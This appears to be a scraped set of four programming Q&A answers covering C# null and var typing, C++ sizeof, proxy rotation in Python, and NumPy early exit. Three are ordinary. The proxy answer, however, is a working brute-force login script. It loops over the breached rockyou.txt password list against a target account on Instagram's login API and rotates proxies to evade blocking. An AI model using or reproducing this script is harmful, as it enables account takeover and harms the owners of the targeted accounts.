Q: Why hasn’t C# evolved null into a fully target-typed literal like default or []? A:

var explanation in case you don't know:

var does not mean dynamic typing.
It actually means: let the compiler figure out the type

Your Problem

You don't need the casts the problem you are facing here is using var at spots where the compiler has no way of knowing what the types of null are.

Let me break down each example:

Example 1:

  var data = ((Guid?)null, false);
    _mockClient.MockResponse<UserQuery, (Guid? DeptoGuid, bool IsInactive)>(data);
//more stuff...

Now here you are creating a tuple with two values. Since you are passing false as one value the compiler knows that the second value of that tuple is a bool.

But since null can be passed to represent any nullable type the compiler has no way of knowing what the type of the first tuple value is.

result: since C# is a statically-typed language that of course throws a compiler error.

Fix

Now let's look at how this could be fixed.

What needs to be done is the compiler needs to know what type that first value has so we can just swap var with the actual type:

(Guid? id, bool flag) data = (null, false); //--> no cast

Example 2

//stuff..

var guid = hrDeptos.Count == 1
    ? hrDeptos[0].deptoGuid
    : (Guid?)null;

Here the Problem is in the else case again since you are using var the compiler has no way of knowing what type the variable guid should have.

Because of the type of deptoGuid it knows that in the true case the type of guid is going to be Guid. And since both the true and false branch need to return the same type, in the false case it infers from the true case that the type of guid should be Guid and since Guid != Guid?, the compiler thinks that you are trying to return two differnt types from one ternary operator and throws an error.

Fix

Again this can just be solved by telling the compiler what you want.

Guid? guid = hrDeptos.Count == 1 
                    ? hrDeptos[0].deptoGuid 
                    : null; //--> again no cast

Bonus Tip

Using the null-conditional operator (?) and linq's FirstOrDefault (or SingleOrDefault depending on your use case) method Exmaple 2 can be simplified

var guid = hrDeptos.FirstOrDefault()?.deptoGuid;

This bascially says whatever comes before the ? could be null and if it is -> don't access anything on it just return null

Q: C++ sizeof std::vector A:

Introducing type aliases (as typedefs do) does not require any storage in each std::vector object.

Only [non-static] data members require that.

But sizeof yields the size of object representation, and therefore the typedefs do not affect it.

Next time, please post such a question as a "normal" (newly AKA Troubleshooting/Debugging) question rather than an open-ended "advice" one (since it has a clear answer which is not opinion based).

Q: How to use all proxies from proxy list while sending requests in cycle? A:

import requests

import random

from itertools import cycle

proxies = cycle(['http://proxy1:port', 'http://proxy2:port']) # Your proxy list

headers = {

'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',

'X-IG-App-ID': '936619743392459'  # Instagram app ID

}

wordlist = open('rockyou.txt', 'r') # Breached passwords

for email in ['target@example.com']: # Target email/username

for pwd in wordlist:

    pwd = pwd.strip()

    data = {'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{pwd}', 'username': email}

    try:

        r = requests.post('https://i.instagram.com/api/v1/accounts/login/ajax/', 

                         data=data, headers=headers, proxies={'http': next(proxies)})

        if '"authenticated":true' in r.text:

            print(f"\[+\] HIT: {email}:{pwd}")

            break

    except:

        pass

Q: Can this Python logical expression be replaced with a Numpy one? A:

I am aware that this wasn't really the question, but it bugs me a bit.

Checking all items in the bordering vectors for the purpose of knowing if any match, is overkill. If we only want to know whether there is one match, we can stop checking the vector as soon as we found one. To do this, we can implement a small function.

def contains_k(arr, K):
    for a in arr:
        if a == K:
            return True
    return False

This won't have any noticeable difference in runtime for the given example, but if we enlarge the dataset a notable difference quickly emerges.

If we arbitrarily change the value of N to 29999 it takes:

np.any(a[0, :]==K) & np.any(a[-1, :]==K) & np.any(a[:, 0]==K) & np.any(a[:, -1]==K)

1.2 seconds to complete, while

contains_k(a[0, :],K) & contains_k(a[-1, :],K) & contains_k(a[:, 0], K) & contains_k(a[:, -1],K)

needs only 0.1 second to complete.
